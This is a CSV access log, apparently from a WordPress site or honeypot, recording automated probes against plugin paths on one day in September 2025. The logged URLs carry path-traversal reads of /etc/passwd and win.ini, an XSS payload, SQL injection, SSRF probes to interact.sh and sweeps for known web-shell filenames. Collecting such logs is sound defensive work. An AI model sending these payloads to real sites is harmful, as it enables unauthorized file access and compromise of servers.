"ip","time","path","useragent","source"
"162.158.163.124","2025-09-08T00:51:37Z","/wp-content/plugins/usc-e-shop/functions/content-log.php?logfile=/Windows/win.ini","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15","plugin_php"
"172.68.164.61","2025-09-08T00:52:28Z","/wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36","plugin_php"
"162.158.108.44","2025-09-08T00:52:48Z","/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd","Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","plugin_php"
"162.158.108.44","2025-09-08T00:52:49Z","/wp-content/plugins/robotcpa/f.php?l=ZmlsZTovLy9ldGMvcGFzc3dk","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0","plugin_php"
"172.70.208.129","2025-09-08T00:52:50Z","/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15","plugin_php"
"104.23.175.206","2025-09-08T00:52:57Z","/wp-content/plugins/index.php","-","plugin_php"
"172.71.81.163","2025-09-08T00:53:50Z","/wp-content/plugins/wp-easycart/inc/admin/phpinfo.php","Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36","plugin_php"
"162.158.163.124","2025-09-08T00:54:14Z","/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.1","plugin_php"
"162.158.163.124","2025-09-08T00:54:26Z","/wp-content/plugins/phastpress/phast.php?service=scripts&src=https%3A%2F%2Finteract.sh","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15","plugin_php"
"172.70.143.195","2025-09-08T00:54:47Z","/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20--&f=user_login&type&e","Mozilla/5.0 (Knoppix; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0","plugin_php"
"162.158.190.88","2025-09-08T00:56:14Z","/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","plugin_php"
"172.71.124.225","2025-09-08T00:56:14Z","/wp-content/plugins/fancy-product-designer/inc/custom-image-handler.php","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15","plugin_php"
"162.158.163.124","2025-09-08T00:56:20Z","/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd","Mozilla/5.0 (ZZ; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0","plugin_php"
"172.70.208.128","2025-09-08T00:57:57Z","/wp-content/plugins/amministrazione-aperta/wpgov/dispatcher.php?open=../../../../../../../../../../etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15","plugin_php"
"162.158.108.45","2025-09-08T00:58:01Z","/wp-content/plugins/stageshow/stageshow_redirect.php?url=http%3A%2F%2Finteract.sh","Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/107.0 Safari/537.36","plugin_php"
"172.71.152.46","2025-09-08T02:04:57Z","/wp-content/plugins/fix/up.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36","plugin_php"
"108.162.226.100","2025-09-08T02:05:11Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.189.145","2025-09-08T02:29:32Z","/wp-content/plugins/","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"162.158.106.231","2025-09-08T02:35:13Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.170.152","2025-09-08T02:46:46Z","/wp-content/plugins/hanau/akc.php","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.70.189.83","2025-09-08T02:47:25Z","/wp-content/plugins/geu/geu.php","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"162.158.190.87","2025-09-08T02:47:41Z","/wp-content/plugins/deu/ms.php","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"162.158.190.87","2025-09-08T02:47:57Z","/wp-content/plugins/view-ad/ms.php","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.69.176.111","2025-09-08T02:55:16Z","/wp-content/plugins/index.php","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","plugin_php"
"172.68.164.60","2025-09-08T02:55:18Z","/wp-content/plugins/admin.php","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","plugin_php"
"108.162.226.160","2025-09-08T02:55:18Z","/wp-content/plugins/inputs.php","Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","plugin_php"
"108.162.226.252","2025-09-08T02:59:45Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.208.134","2025-09-08T03:08:45Z","/wp-content/plugins/admin.php?https://pelayananpublik.id///wp-content/plugins/admin.php","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.70.143.66","2025-09-08T03:08:48Z","/wp-content/plugins/Update/wp-blog.php?https://pelayananpublik.id///wp-content/plugins/Update/wp-blog.php","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.70.93.115","2025-09-08T03:09:39Z","/wp-content/plugins/file.php?https://pelayananpublik.id///wp-content/plugins/file.php","Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36","plugin_php"
"172.70.208.134","2025-09-08T03:18:35Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.88.171","2025-09-08T03:18:55Z","/wp-content/plugins/core/include.php","-","plugin_php"
"104.23.175.38","2025-09-08T03:19:01Z","/wp-content/plugins/wp-apxupx.php?apx=upx","-","plugin_php"
"104.23.175.39","2025-09-08T03:19:06Z","/wp-content/plugins/linkpreview/db.php?u","-","plugin_php"
"172.70.189.164","2025-09-08T03:19:08Z","/wp-content/plugins/seoplugins/db.php?u","-","plugin_php"
"172.70.93.114","2025-09-08T03:19:08Z","/wp-content/plugins/seoplugins/mar.php","-","plugin_php"
"108.162.226.253","2025-09-08T03:19:14Z","/wp-content/plugins/index.php","-","plugin_php"
"172.70.189.164","2025-09-08T03:19:17Z","/wp-content/plugins/revslider/includes/external/page/index.php","-","plugin_php"
"162.158.170.227","2025-09-08T03:19:19Z","/wp-content/plugins/Cache/Cache.php","-","plugin_php"
"172.70.93.114","2025-09-08T03:19:36Z","/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/admin.php","-","plugin_php"
"172.70.208.134","2025-09-08T03:19:38Z","/wp-content/plugins/fix/up.php","-","plugin_php"
"162.158.170.227","2025-09-08T03:19:40Z","/wp-content/plugins/wordpress-seo/rk1.php","-","plugin_php"
"172.70.189.164","2025-09-08T03:19:42Z","/wp-content/plugins/zgdsfagck/rk2.php","-","plugin_php"
"108.162.226.253","2025-09-08T03:19:44Z","/wp-content/plugins/rsquaaj/index4.php","-","plugin_php"
"108.162.227.95","2025-09-08T03:23:35Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.208.128","2025-09-08T03:37:27Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.71.124.28","2025-09-08T03:50:17Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.70.188.70","2025-09-08T03:50:18Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.69.176.90","2025-09-08T03:53:49Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.69.176.90","2025-09-08T03:53:49Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"108.162.226.111","2025-09-08T03:55:42Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"108.162.226.111","2025-09-08T03:55:43Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.163.211","2025-09-08T03:56:51Z","/wp-content/plugins/count-per-day/js/yc/d00.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.88.56","2025-09-08T03:56:51Z","/wp-content/plugins/disqus-comment-system//2.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.143.191","2025-09-08T03:56:52Z","/wp-content/plugins/disqus-comment-system//admin.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.92.249","2025-09-08T03:56:52Z","/wp-content/plugins/disqus-comment-system//amad.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"104.23.175.215","2025-09-08T03:56:53Z","/wp-content/plugins/disqus-comment-system//gaza.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.68.164.46","2025-09-08T03:56:53Z","/wp-content/plugins/disqus-comment-system//r57.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.143.191","2025-09-08T03:56:53Z","/wp-content/plugins/disqus-comment-system//sa.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.71.82.74","2025-09-08T03:56:53Z","/wp-content/plugins/disqus-comment-system//sa2.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.71.82.74","2025-09-08T03:56:54Z","/wp-content/plugins/disqus-comment-system//shell.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.189.103","2025-09-08T03:56:54Z","/wp-content/plugins/disqus-comment-system//t00.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.208.128","2025-09-08T03:56:54Z","/wp-content/plugins/disqus-comment-system//up.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.208.128","2025-09-08T03:56:55Z","/wp-content/plugins/disqus-comment-system//upload.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.170.199","2025-09-08T03:56:55Z","/wp-content/plugins/disqus-comment-system//uploads.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.208.128","2025-09-08T03:56:55Z","/wp-content/plugins/disqus-comment-system/0day.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.143.191","2025-09-08T03:56:56Z","/wp-content/plugins/disqus-comment-system/1.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.71.124.197","2025-09-08T03:56:56Z","/wp-content/plugins/disqus-comment-system/2.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.71.124.196","2025-09-08T03:56:57Z","/wp-content/plugins/disqus-comment-system/Cpanel.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.71.124.197","2025-09-08T03:56:57Z","/wp-content/plugins/disqus-comment-system/DZ.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.88.56","2025-09-08T03:56:58Z","/wp-content/plugins/disqus-comment-system/L3b.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.163.212","2025-09-08T03:56:58Z","/wp-content/plugins/disqus-comment-system/Sec-War.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"108.162.227.132","2025-09-08T03:56:58Z","/wp-content/plugins/disqus-comment-system/Sh3ll.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.108.44","2025-09-08T03:56:58Z","/wp-content/plugins/disqus-comment-system/Sym.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.108.45","2025-09-08T03:56:59Z","/wp-content/plugins/disqus-comment-system/WSO.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"108.162.227.132","2025-09-08T03:56:59Z","/wp-content/plugins/disqus-comment-system/WolF.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.68.164.46","2025-09-08T03:56:59Z","/wp-content/plugins/disqus-comment-system/admin.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"104.23.175.215","2025-09-08T03:57:00Z","/wp-content/plugins/disqus-comment-system/admin1.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.189.103","2025-09-08T03:57:00Z","/wp-content/plugins/disqus-comment-system/amad.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.88.56","2025-09-08T03:57:03Z","/wp-content/plugins/disqus-comment-system/c100.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.108.45","2025-09-08T03:57:04Z","/wp-content/plugins/disqus-comment-system/c22.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.68.164.46","2025-09-08T03:57:04Z","/wp-content/plugins/disqus-comment-system/c99.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.69.176.55","2025-09-08T03:57:04Z","/wp-content/plugins/disqus-comment-system/changeall.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.108.44","2025-09-08T03:57:04Z","/wp-content/plugins/disqus-comment-system/configuration.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.106.162","2025-09-08T03:57:05Z","/wp-content/plugins/disqus-comment-system/cp.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.163.138","2025-09-08T03:57:05Z","/wp-content/plugins/disqus-comment-system/cpanel.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.69.176.55","2025-09-08T03:57:05Z","/wp-content/plugins/disqus-comment-system/cpn.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"104.23.175.215","2025-09-08T03:57:06Z","/wp-content/plugins/disqus-comment-system/d.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.189.25","2025-09-08T03:57:06Z","/wp-content/plugins/disqus-comment-system/d0mains.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.71.82.74","2025-09-08T03:57:06Z","/wp-content/plugins/disqus-comment-system/dam.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.92.249","2025-09-08T03:57:07Z","/wp-content/plugins/disqus-comment-system/disqus.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.143.191","2025-09-08T03:57:07Z","/wp-content/plugins/disqus-comment-system/dom.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.108.45","2025-09-08T03:57:07Z","/wp-content/plugins/disqus-comment-system/dz.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.143.191","2025-09-08T03:57:08Z","/wp-content/plugins/disqus-comment-system/dz0.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.108.44","2025-09-08T03:57:08Z","/wp-content/plugins/disqus-comment-system/egyshell.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.69.176.55","2025-09-08T03:57:08Z","/wp-content/plugins/disqus-comment-system/g.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.92.249","2025-09-08T03:57:08Z","/wp-content/plugins/disqus-comment-system/gaza.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.69.176.55","2025-09-08T03:57:09Z","/wp-content/plugins/disqus-comment-system/images/Sym.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.71.124.197","2025-09-08T03:57:09Z","/wp-content/plugins/disqus-comment-system/info.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.88.56","2025-09-08T03:57:10Z","/wp-content/plugins/disqus-comment-system/k.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.162.68","2025-09-08T03:57:10Z","/wp-content/plugins/disqus-comment-system/killer.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.71.82.74","2025-09-08T03:57:10Z","/wp-content/plugins/disqus-comment-system/ls.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.143.191","2025-09-08T03:57:11Z","/wp-content/plugins/disqus-comment-system/madspot.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"104.23.175.215","2025-09-08T03:57:11Z","/wp-content/plugins/disqus-comment-system/madspotshell.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"162.158.162.68","2025-09-08T03:57:11Z","/wp-content/plugins/disqus-comment-system/mysql.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"104.23.175.215","2025-09-08T03:57:12Z","/wp-content/plugins/disqus-comment-system/r00t.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"172.70.92.249","2025-09-08T03:57:12Z","/wp-content/plugins/disqus-comment-system/r57.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
"108.162.227.132","2025-09-08T03:57:12Z","/wp-content/plugins/disqus-comment-system/sa.php","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)","plugin_php"
